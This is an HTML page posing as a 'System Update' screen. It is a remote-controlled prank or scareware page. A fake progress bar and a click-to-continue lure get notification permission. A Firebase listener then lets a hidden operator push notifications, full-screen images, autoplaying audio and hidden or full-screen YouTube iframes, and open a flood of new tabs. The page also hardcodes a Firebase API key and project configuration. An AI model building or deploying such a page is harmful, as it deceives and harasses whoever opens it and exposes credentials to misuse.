<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>System Update</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<style>
html,body{margin:0;padding:0;height:100%;width:100%;background:#f0f0f0;font-family:sans-serif;cursor:pointer;display:flex;justify-content:center;align-items:center;text-align:center;overflow:hidden;}
#overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:#f0f0f0;display:flex;justify-content:center;align-items:center;z-index:10;}
#overlay h1{font-size:28px;color:#222;}
#status{font-size:18px;margin-top:10px;color:#333;}
img{max-width:100%;max-height:100%;position:absolute;top:0;left:0;z-index:20;display:none;}
audio,iframe{display:none;}
.loader{position:absolute;top:10px;left:10px;height:6px;background:#1f2430;width:100%;border-radius:3px;overflow:hidden;}
.loader-fill{height:100%;width:0%;background:#4da3ff;transition:0.2s;}
</style>
</head>
<body>

<div id="overlay"><h1>Click anywhere to continue update...</h1></div>
<div>
<p id="status">System updating...</p>
<div class="loader"><div class="loader-fill" id="loaderFill"></div></div>
<img id="img">
<audio id="audio" controls></audio>
<div id="ytContainer"></div>
</div>

<script>
const firebaseConfig = {
  apiKey:"AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
  authDomain:"notify-f0a18.firebaseapp.com",
  databaseURL:"https://notify-f0a18-default-rtdb.firebaseio.com",
  projectId:"notify-f0a18"
};
firebase.initializeApp(firebaseConfig);
const db=firebase.database();

let enabled=false;
const overlay=document.getElementById("overlay");
overlay.addEventListener("click",()=>{
  Notification.requestPermission();
  enabled=true;
  overlay.style.display="none";
});

db.ref("signal").on("value",snap=>{
  const d=snap.val();
  if(!d) return;

  // Text
  if(d.type==="text"){
    document.getElementById("status").innerText=d.message;
    if(enabled && Notification.permission==="granted")
      new Notification("System",{body:d.message});
  }

  // Image
  if(d.type==="image"){
    const img=document.getElementById("img");
    img.src=d.data;
    img.style.display="block";
  }

  // Audio
  if(d.type==="audio" && enabled){
    const audio=document.getElementById("audio");
    audio.src=d.data;
    audio.play().catch(()=>{});
  }

  // YouTube
  if(d.type==="youtube"){
    const container=document.getElementById("ytContainer");
    container.innerHTML="";
    let url=d.url;
    let embed=`https://www.youtube.com/embed/${url.split("v=")[1].split("&")[0]}?autoplay=1`;
    const ifr=document.createElement("iframe");
    ifr.src=embed;
    if(d.mode==="hidden"){
      ifr.width=1; ifr.height=1; ifr.style.position="absolute"; ifr.style.left="-1000px";
    } else {
      ifr.width=window.innerWidth; ifr.height=window.innerHeight; ifr.style.position="absolute"; ifr.style.top=0; ifr.style.left=0;
    }
    container.appendChild(ifr);
  }

  // Popups / tabs
  if(d.type==="popup" && enabled){
    for(let i=0;i<d.count;i++){
      window.open("about:blank","_blank");
    }
  }
});
</script>
</body>
</html>
